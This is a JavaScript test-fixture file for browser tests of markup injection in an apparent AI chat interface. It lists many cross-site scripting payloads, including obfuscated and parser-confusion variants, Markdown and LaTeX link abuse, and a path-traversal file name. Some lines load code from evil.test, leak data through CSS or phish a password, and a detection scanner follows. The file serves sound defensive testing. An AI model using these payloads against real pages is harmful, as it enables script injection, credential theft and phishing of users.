// Hostile text for the markup tests (tests/browser/markup-injection.e2e.js): what a model, a file or a search result could write to get code to
// run in the page, or to send the person somewhere through the page.

export const PAYLOADS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.test/x.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)" />',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<svg><set attributeName=onmouseover to=alert(1)>',
  '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<math><maction actiontype="statusline#http://evil.test" xlink:href="javascript:alert(1)">x</maction></math>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
  '<embed src="javascript:alert(1)">',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<form><button formaction="javascript:alert(1)">x</button></form>',
  '<button onclick=alert(1)>x</button>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href=" jav&#x09;ascript:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<a href="https://evil.test" onmouseover="alert(1)">x</a>',
  '<a href="https://evil.test" target="_blank">x</a>',
  '<link rel=stylesheet href="https://evil.test/x.css">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="https://evil.test/">',
  '<style>@import "https://evil.test/x.css"; body{background:url(javascript:alert(1))}</style>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="width:expression(alert(1))">x</div>',
  '<div style="position:fixed;inset:0;z-index:99999;background:#fff">Session expired. Sign in again: <a href="https://evil.test">here</a></div>',
  '<style>body{display:none} .ac-file-link{background:url(https://evil.test/leak)}</style>',
  '<form action="https://evil.test/login" method="post">Password: <input name="password" type="password"><button>Sign in</button></form>',
  '<details open ontoggle=alert(1)>x</details>',
  '<video><source onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<select autofocus onfocus=alert(1)>',
  '<textarea autofocus onfocus=alert(1)>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<body onload=alert(1)>',
  '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><script>alert(1)</script></template>',
  '<style><img src="</style><img src=x onerror=alert(1)>">',
  '<p title="<img src=x onerror=alert(1)>">x</p>',
  '<a href="x" title="`><img src=x onerror=alert(1)>">x</a>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<xmp><script>alert(1)</script></xmp>',
  '<plaintext><script>alert(1)</script>',
  '<think><img src=x onerror=alert(1)></think>',
  '<think></summary><img src=x onerror=alert(1)></think>',
  '[x](javascript:alert(1))',
  '[x]( javascript:alert(1))',
  '[x](JAVASCRIPT:alert(1))',
  '[x](&#106;avascript:alert(1))',
  '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[x](vbscript:msgbox(1))',
  '[x](https://evil.test "t\\" onmouseover=\\"alert(1)")',
  '![x](javascript:alert(1))',
  '![x"onerror="alert(1)](https://evil.test/x.png)',
  '![x](https://evil.test/x.png "t\\" onerror=\\"alert(1)")',
  '[x][ref]\n\n[ref]: javascript:alert(1)',
  '<javascript:alert(1)>',
  '<https://evil.test/"onmouseover="alert(1)>',
  '```html\n<script>alert(1)</script>\n```',
  '`<img src=x onerror=alert(1)>`',
  '    <img src=x onerror=alert(1)>',
  '| a | b |\n|---|---|\n| <img src=x onerror=alert(1)> | <script>alert(1)</script> |',
  '- <img src=x onerror=alert(1)>\n- [x](javascript:alert(1))',
  '> <img src=x onerror=alert(1)>',
  '# <img src=x onerror=alert(1)>',
  '*<img src=x onerror=alert(1)>*',
  '**[x](javascript:alert(1))**',
  '~~<script>alert(1)</script>~~',
  '$<img src=x onerror=alert(1)>$',
  '$$<img src=x onerror=alert(1)>$$',
  '$\\href{javascript:alert(1)}{x}$',
  '$\\url{javascript:alert(1)}$',
  '$\\htmlClass{x" onmouseover="alert(1)}{y}$',
  '$\\htmlId{x}{y}$ $\\htmlStyle{background:url(javascript:alert(1))}{y}$',
  '$\\htmlData{x=y" onerror="alert(1)}{y}$',
  '$\\includegraphics{javascript:alert(1)}$',
  '$\\text{<img src=x onerror=alert(1)>}$',
  '$\\text{</span><img src=x onerror=alert(1)>}$',
  '\\(<svg onload=alert(1)>\\)',
  '\\[<img src=x onerror=alert(1)>\\]',
  '```chart\n{"type":"bar","title":"<img src=x onerror=alert(1)>","data":[{"label":"<script>alert(1)</script>","value":1}]}\n```',
  '```skill-draft\n<img src=x onerror=alert(1)>\n```',
  '````file <img src=x onerror=alert(1)>.txt\nx\n````',
  '````file "><script>alert(1)</script>.html\n<script>alert(1)</script>\n````',
  '````file x.html\n<img src=x onerror=alert(1)>\n````',
  '````file x.svg\n<svg onload=alert(1)></svg>\n````',
  '````file x.md\n[x](javascript:alert(1))\n````',
  '````file ../../etc/passwd\nx\n````',
  '````file x.txt\n</pre><img src=x onerror=alert(1)>\n````',
  '[1] [2] [3]',
  '<span class="cite-pill" data-cite=\'[{"n":1,"t":"x","u":"javascript:alert(1)"}]\'>x</span>',
  '<button class="cite-pill" data-cite=\'[{"n":1,"t":"<img src=x onerror=alert(1)>","u":"https://evil.test"}]\'>x</button>',
  '<div class="ac-file-card" data-file="x"><a class="ac-file-link" href="javascript:alert(1)">x</a></div>',
  '<div class="sandbox-run"><img src=x onerror=alert(1)></div>',
  '<div class="ac-chart" data-chart=\'{"type":"bar"}\' onclick="alert(1)">x</div>',
  '<img src=x onerror=alert(1)//',
  '<img src=`x`onerror=alert(1)>',
  '<img/src=x/onerror=alert(1)>',
  '<img src=x onerror=alert&#40;1&#41;>',
  '<a href="#" onclick="&#97;lert(1)">x</a>',
  '‮<img src=x onerror=alert(1)>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<<script>script>alert(1)<</script>/script>'
];

export const SOURCES = [
  { n: 1, title: '<img src=x onerror=alert(1)>', url: 'https://example.com/a' },
  { n: 2, title: 'x', url: 'javascript:alert(1)' },
  { n: 3, title: 'x', url: 'https://example.com/"onmouseover="alert(1)' },
  { n: 4, title: '"><script>alert(1)</script>', url: 'https://evil.test/<svg onload=alert(1)>' },
  { n: 5, title: 'x', url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' }
];

export const MALICIOUS_RUN = {
  status: 'done',
  elapsedMs: 1000,
  thought: '<img src=x onerror=alert(1)>',
  fallback: '<img src=x onerror=alert(1)>',
  steps: [
    { title: '<img src=x onerror=alert(1)>', code: '<script>alert(1)</script>', stdout: '<img src=x onerror=alert(1)>', stderr: '<svg onload=alert(1)>', narration: '<img src=x onerror=alert(1)>', error: '<script>alert(1)</script>',
      files: [{ name: '"><img src=x onerror=alert(1)>.png', size: 1, id: 'abc' }, { name: 'javascript:alert(1).txt', size: 2 }, { name: '<script>alert(1)</script>.csv', size: 3 }],
      skipped: [{ name: '<img src=x onerror=alert(1)>', reason: '<script>alert(1)</script>' }] }
  ],
  sources: SOURCES,
  connectors: [{ name: '<img src=x onerror=alert(1)>' }, '<script>alert(1)</script>'],
  pictures: [{ name: '<img src=x onerror=alert(1)>' }],
  council: { members: [{ name: '<img src=x onerror=alert(1)>', model: '<script>alert(1)</script>' }] }
};

// Runs in the page: everything in `html` a browser would run or navigate to, as a list (empty when it is clean).
export const SCANNER = `
window.scanMarkup = (html) => {
  const FORBIDDEN_TAGS = ['script', 'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'link', 'meta', 'base', 'form', 'style', 'noscript', 'foreignobject', 'animate', 'set', 'handler', 'listener'];
  const URL_ATTRIBUTES = ['href', 'src', 'action', 'formaction', 'xlink:href', 'data', 'poster', 'background', 'codebase', 'cite', 'longdesc', 'srcset'];
  const schemeOf = (value) => String(value).replace(/[\\u0000-\\u0020\\u007f-\\u009f]/g, '').toLowerCase();
  const body = new DOMParser().parseFromString('<body>' + html + '</body>', 'text/html').body;
  const found = [];
  for (const element of body.querySelectorAll('*')) {
    const tag = element.tagName.toLowerCase();
    if (FORBIDDEN_TAGS.includes(tag)) found.push('<' + tag + '>');
    for (const attribute of [...element.attributes]) {
      const name = attribute.name.toLowerCase();
      const value = schemeOf(attribute.value);
      if (name.startsWith('on')) found.push(tag + '[' + name + ']');
      if (name === 'srcdoc') found.push(tag + '[srcdoc]');
      if (URL_ATTRIBUTES.includes(name) && /^(?:javascript|vbscript|livescript|data:text\\/html|data:application|data:image\\/svg)/.test(value)) found.push(tag + '[' + name + '=' + value.slice(0, 30) + ']');
      if (name === 'style' && /expression\\(|javascript:|vbscript:|position\\s*:\\s*(?:fixed|sticky)|url\\(/i.test(attribute.value)) found.push(tag + '[style]');
    }
  }
  return found;
};
`;
